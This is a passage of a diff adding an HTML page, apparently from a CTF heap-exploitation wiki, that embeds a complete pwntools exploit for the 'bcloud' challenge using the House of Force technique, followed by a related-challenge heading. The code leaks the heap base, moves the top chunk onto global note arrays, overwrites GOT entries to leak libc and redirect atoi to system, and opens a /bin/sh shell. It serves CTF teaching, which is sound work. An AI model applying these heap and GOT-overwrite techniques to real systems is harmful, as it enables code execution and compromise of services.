+    offset += idx * 2 * word_bytes  # idx&#13;
+    offset -= word_bytes * 2  # bin overlap&#13;
+    return offset&#13;
+&#13;
+&#13;
+def exp():&#13;
+    # leak heap base&#13;
+    p.sendafter('Input your name:\n', 'a' * 64)&#13;
+    p.recvuntil('Hey ' + 'a' * 64)&#13;
+    # sub name's chunk' s header&#13;
+    heap_base = u32(p.recv(4)) - 8&#13;
+    log.success('heap_base: ' + hex(heap_base))&#13;
+    p.sendafter('Org:\n', 'a' * 64)&#13;
+    p.sendlineafter('Host:\n', p32(0xffffffff))&#13;
+    # name,org,host, for each is (0x40+8)&#13;
+    topchunk_addr = heap_base + (0x40 + 8) * 3&#13;
+&#13;
+    # make topchunk point to 0x0804B0A0-8&#13;
+    p.sendlineafter('option---&gt;&gt;', '1')&#13;
+    notesize_addr = 0x0804B0A0&#13;
+    notelist_addr = 0x0804B120&#13;
+    targetaddr = notesize_addr - 8&#13;
+    offset_target_top = targetaddr - topchunk_addr&#13;
+    # 4 for size_t, 7 for malloc_allign&#13;
+    malloc_size = offset_target_top - 4 - 7&#13;
+    # plus 4 because malloc(v2 + 4);&#13;
+    p.sendlineafter('Input the length of the note content:\n',&#13;
+                    str(malloc_size - 4))&#13;
+    # most likely malloc_size-4&lt;0...&#13;
+    if malloc_size - 4 &gt; 0:&#13;
+        p.sendlineafter('Input the content:\n', '')&#13;
+&#13;
+    #gdb.attach(p)&#13;
+    # set notesize[0] = notesize[1] = notesize[2]=16&#13;
+    # set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got&#13;
+    p.sendlineafter('option---&gt;&gt;', '1')&#13;
+    p.sendlineafter('Input the length of the note content:\n', str(1000))&#13;
+&#13;
+    payload = p32(16) * 3 + (notelist_addr - notesize_addr - 12) * 'a' + p32(&#13;
+        bcloud.got['free']) + p32(bcloud.got['atoi']) * 2&#13;
+    p.sendlineafter('Input the content:\n', payload)&#13;
+&#13;
+    # overwrite free@got with puts@plt&#13;
+    p.sendlineafter('option---&gt;&gt;', '3')&#13;
+    p.sendlineafter('Input the id:\n', str(0))&#13;
+    p.sendlineafter('Input the new content:\n', p32(bcloud.plt['puts']))&#13;
+&#13;
+    # leak atoi addr by fake free&#13;
+    p.sendlineafter('option---&gt;&gt;', '4')&#13;
+    p.sendlineafter('Input the id:\n', str(1))&#13;
+    atoi_addr = u32(p.recv(4))&#13;
+    libc_base = atoi_addr - libc.symbols['atoi']&#13;
+    system_addr = libc_base + libc.symbols['system']&#13;
+    log.success('libc base addr: ' + hex(libc_base))&#13;
+&#13;
+    # overwrite atoi@got with system&#13;
+    p.sendlineafter('option---&gt;&gt;', '3')&#13;
+    p.sendlineafter('Input the id:\n', str(2))&#13;
+    p.sendlineafter('Input the new content:\n', p32(system_addr))&#13;
+&#13;
+    # get shell&#13;
+    p.sendlineafter('option---&gt;&gt;', '/bin/sh\x00')&#13;
+    p.interactive()&#13;
+&#13;
+&#13;
+if __name__ == "__main__":&#13;
+    exp()</a>
+</h3>
+<h3 class="topic">
+<a name="2o0n3ufh4o0ummip8kahur2ps4">&nbsp;&nbsp;相关题目</a>
+</h3>
+<h3 class="topic">
+<a name="7rrh83jjlmu2kf5rh8261o6rrh">&nbsp;&nbsp;&nbsp;2016 Boston Key Party CTF cookbook</a>
+</h3>
+</body>
+</html>
